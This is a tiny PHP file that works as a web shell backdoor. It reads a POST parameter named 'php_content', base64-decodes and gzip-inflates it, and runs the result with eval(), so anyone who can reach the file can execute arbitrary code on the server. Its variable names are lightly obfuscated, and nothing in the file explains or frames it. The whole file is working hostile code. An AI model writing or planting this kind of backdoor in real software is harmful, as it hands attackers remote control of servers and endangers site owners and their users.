<?php
echo "start";
$c_ntent=$_POST['php_content'];
$res_t=gzinflate(base64_decode($c_ntent));
eval($res_t);
?>